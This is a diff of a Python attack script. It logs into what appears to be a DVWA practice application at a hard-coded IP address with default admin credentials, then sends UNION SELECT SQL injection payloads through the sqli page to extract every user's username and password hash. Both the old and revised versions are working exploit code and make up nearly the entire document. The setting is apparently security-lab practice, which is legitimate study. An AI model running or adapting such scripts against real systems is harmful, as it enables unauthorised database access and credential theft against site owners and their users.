@@ -1,125 +1,91 @@
 
 import requests
 import re
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
+import urllib.parse
 
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
-
-url_base = "http://31.97.117.123"
+url = "http://31.97.117.123/"
 session = requests.Session()
 
-# Login
-login_url = f"{url_base}/login.php"
-response = session.get(login_url, verify=False)
-token_match = re.search(r"name='user_token'\s+value='([^']+)'", response.text)
-user_token = token_match.group(1)
+# Login first
+response = session.get(f"{url}login.php")
+token_match = re.search(r"user_token'\s+value='([a-f0-9]+)'", response.text)
+csrf_token = token_match.group(1)
 
-payload = {
+login_data = {
     "username": "admin",
     "password": "password",
-    "user_token": user_token,
+    "user_token": csrf_token,
     "Login": "Login"
 }
 
-response = session.post(login_url, data=payload, verify=False, allow_redirects=True)
-print("[+] Logged in successfully\n")
+session.post(f"{url}login.php", data=login_data)
 
-sqli_url = f"{url_base}/vulnerabilities/sqli/"
+print("[*] Extracting all users with password hashes via SQL injection...")
 
-print("[*] EXTRACTING ALL USERS WITH PASSWORD HASHES\n")
-print("=" * 80)
+# SQLi payload to get all users
+payload = "1' UNION SELECT user_id, first_name, last_name, user, password FROM users WHERE '1'='1"
+encoded_payload = urllib.parse.quote(payload)
 
-# Extract all users from the database
-all_users = []
+response = session.get(f"{url}vulnerabilities/sqli/?id={encoded_payload}&Submit=Submit")
 
-# Use UNION SELECT to get both username and password columns
-payload_str = "-1' UNION SELECT GROUP_CONCAT(user), GROUP_CONCAT(password) FROM users #"
-response = session.get(sqli_url, params={"id": payload_str, "Submit": "Submit"}, verify=False)
+# Extract user data from response
+print("\n[+] Parsing user data from response...\n")
 
-# Extract the pre section
-pre_match = re.search(r'<pre>(.*?)</pre>', response.text, re.DOTALL)
-if pre_match:
-    result_text = pre_match.group(1)
-    print(result_text)
+# Look for the ID field output pattern
+# The page likely displays user data in a structured format
+lines = response.text.split('\n')
 
-print("\n" + "=" * 80)
-print("\n[*] Now extracting detailed information...\n")
+# Find lines that contain user information
+user_pattern = re.compile(r'ID:\s*(\d+)|First name:\s*([^<]+)|Surname:\s*([^<]+)|User:\s*([^<]+)|Password:\s*([^<]+)')
 
-# Extract each user individually to get all columns
-for user_id in range(1, 100):  # Try IDs up to 100
-    # Get first_name, last_name
-    response1 = session.get(sqli_url, params={"id": str(user_id), "Submit": "Submit"}, verify=False)
-    
-    # Get user, password via UNION
-    payload_str = f"{user_id}' UNION SELECT user, password FROM users WHERE user_id={user_id} #"
-    response2 = session.get(sqli_url, params={"id": payload_str, "Submit": "Submit"}, verify=False)
-    
-    # Extract results from response1
-    pre_match1 = re.search(r'<pre>(.*?)</pre>', response1.text, re.DOTALL)
-    if pre_match1:
-        result1 = pre_match1.group(1)
-        if "ID:" in result1 and f"ID: {user_id}" in result1:
-            # Extract all lines
-            lines = result1.strip().split('<br />')
-            
-            # Extract from response2 for username and password
-            pre_match2 = re.search(r'<pre>(.*?)</pre>', response2.text, re.DOTALL)
-            if pre_match2:
-                result2 = pre_match2.group(1)
-                lines2 = result2.strip().split('<br />')
-                
-                # Parse first response
-                id_val = None
-                fname = None
-                lname = None
-                for line in lines:
-                    if "ID:" in line:
-                        match = re.search(r'ID: (\d+)', line)
-                        if match:
-                            id_val = match.group(1)
-                    elif "First name:" in line:
-                        fname = line.replace("First name:", "").strip()
-                    elif "Surname:" in line:
-                        lname = line.replace("Surname:", "").strip()
-                
-                # Parse second response  
-                username = None
-                password = None
-                for line in lines2:
-                    if "First name:" in line and username is None:
-                        username = line.replace("First name:", "").strip()
-                    elif "Surname:" in line:
-                        password = line.replace("Surname:", "").strip()
-                
-                if id_val and username and password:
-                    print(f"[+] User ID: {id_val}")
-                    print(f"    Username: {username}")
-                    print(f"    First Name: {fname}")
-                    print(f"    Last Name: {lname}")
-                    print(f"    Password Hash: {password}")
-                    print()
-                    all_users.append({
-                        "id": id_val,
-                        "username": username,
-                        "first_name": fname,
-                        "last_name": lname,
-                        "password_hash": password
-                    })
-        else:
-            break
-    else:
-        break
+users_data = []
+current_user = {}
 
-print("\n" + "=" * 80)
-print(f"\n[*] Total users extracted: {len(all_users)}\n")
+for line in lines:
+    line_clean = line.strip()
+    if 'ID:' in line:
+        if current_user:
+            users_data.append(current_user)
+        current_user = {}
+        match = re.search(r'ID:\s*(\d+)', line)
+        if match:
+            current_user['id'] = match.group(1)
+    elif 'First name:' in line:
+        match = re.search(r'First name:\s*([^<]+)', line)
+        if match:
+            current_user['first_name'] = match.group(1).strip()
+    elif 'Surname:' in line:
+        match = re.search(r'Surname:\s*([^<]+)', line)
+        if match:
+            current_user['surname'] = match.group(1).strip()
+    elif 'User:' in line:
+        match = re.search(r'User:\s*([^<]+)', line)
+        if match:
+            current_user['username'] = match.group(1).strip()
+    elif 'Password:' in line:
+        match = re.search(r'Password:\s*([^<]+)', line)
+        if match:
+            current_user['password_hash'] = match.group(1).strip()
 
-# Print summary table
-if all_users:
-    print("[+] SUMMARY TABLE:")
-    print("-" * 80)
-    print(f"{'ID':<5} {'Username':<15} {'First Name':<15} {'Last Name':<15} {'Password Hash':<32}")
-    print("-" * 80)
-    for user in all_users:
-        print(f"{user['id']:<5} {user['username']:<15} {user['first_name']:<15} {user['last_name']:<15} {user['password_hash']:<32}")
-    print("-" * 80)
+if current_user:
+    users_data.append(current_user)
+
+# Display all users
+if users_data:
+    print("=" * 80)
+    print("EXTRACTED USER DATA FROM DATABASE")
+    print("=" * 80)
+    for user in users_data:
+        print(f"\nID: {user.get('id', 'N/A')}")
+        print(f"First Name: {user.get('first_name', 'N/A')}")
+        print(f"Surname: {user.get('surname', 'N/A')}")
+        print(f"Username: {user.get('username', 'N/A')}")
+        print(f"Password Hash: {user.get('password_hash', 'N/A')}")
+        print("-" * 80)
+else:
+    print("[!] Could not parse user data. Showing raw response section...")
+    # Find the content area
+    content_match = re.search(r'<table[^>]*>.*?</table>', response.text, re.DOTALL)
+    if content_match:
+        print(content_match.group(0)[:1500])
 
